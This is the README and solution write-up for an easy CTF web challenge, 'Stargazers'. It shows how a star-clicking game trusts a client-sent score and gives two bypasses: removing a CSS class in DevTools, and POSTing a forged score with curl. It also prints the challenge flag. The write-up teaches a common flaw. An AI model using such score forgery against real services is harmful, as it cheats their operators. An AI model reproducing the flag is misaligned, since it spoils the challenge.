# Stargazers

#### Category: Web Exploitation

#### Difficulty: Easy

#### Description: Catching stars is incredible.  All you need to do is collect seven of them, and I will give you the reward.

#### Preview:

![image](https://github.com/user-attachments/assets/a59a2bff-7c28-4829-a11f-01bbd2bb1c1b)

## Set Up & Installation

Ensure that docker is installed in your virtual machine before the set up process.

#### [1] Download challenge files
Ensure to download the challenge file `Challenge.zip`

#### [2] Build challenge Docker image 
`sudo docker build -t chall .`

#### [3] Run the image inside a container
`sudo docker run -d chall`

#### [4] Get Docker container IP address
`sudo docker inspect <container-id> | grep 'IP'`

#### [5] Access challenge website
Access to `http://docker-ip-address:8080`

## Solution
<details>

The web challenge needs the user to gather seven stars in order to earn the flag, which they may achieve by just clicking them.  However, there is a catch: if the score hits 6, the star will avoid the cursor and prevent the user from clicking it.

![image](https://github.com/user-attachments/assets/90a05488-0ca4-499a-bd36-6bb68825f8f4)

### Source Code (JS)

The 'unclickable' class preventing the object from being clicked when the score reaches to 6.

```javascript
if (score === 6) {
    object.classList.add('unclickable');
    object.style.backgroundImage = `url('/static/star.png')`; 
    moveAwayFromCursor(object);
}
```

Server accepts JSON data as score directly from the client side without proper validation.

```javascript
fetch('/victory', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
    body: JSON.stringify({ score: score }),
  })
  .then(response => response.json())
  .then(data => {
      messageBox.textContent = data.message;
    
    if (data.message.includes("ICTF25{")) {
      messageBox.textContent = "Congrats! Here's Your Flag: " + data.message;
  }
})
.catch(error => {
  console.error('Error:', error);
  messageBox.textContent = 'Error submitting score.';
});
```

To solve this challenge, there's two solution:

### Method 1
Removing the 'unclickable' class using DevTools.

`document.querySelector('.unclickable').classList.remove('unclickable');`

### Method 2
Sending the score data as JSON directly to server side.

`curl -X POST http://localhost:5000/victory -H 'Content-Type: application/json' -d '{"score":7}'`

We will obtain the flag by using either of these solutions.

<br>

![image](https://github.com/user-attachments/assets/e95af152-47dd-4947-be97-00dc9d27ac8b)

### Flag
> ICTF25{0e9ce052105ac660739950879a243734615e41baca30fa2892646f3bc9307c8e}

</details>
